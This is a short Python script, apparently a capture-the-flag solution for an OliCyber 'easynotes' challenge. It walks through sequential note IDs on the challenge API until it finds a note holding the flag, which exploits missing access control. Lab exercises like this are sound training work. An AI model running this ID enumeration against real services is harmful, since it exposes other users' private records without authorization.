from requests import *

URL = "http://easynotes.challs.olicyber.it/api/note/"

i = 0
while True:
    r = get(URL + str(i))
    i += 1
    
    if "error" in r.text:
        continue
    
    if "flag" in r.json()["content"]:
        print(r.json()["content"])
        break
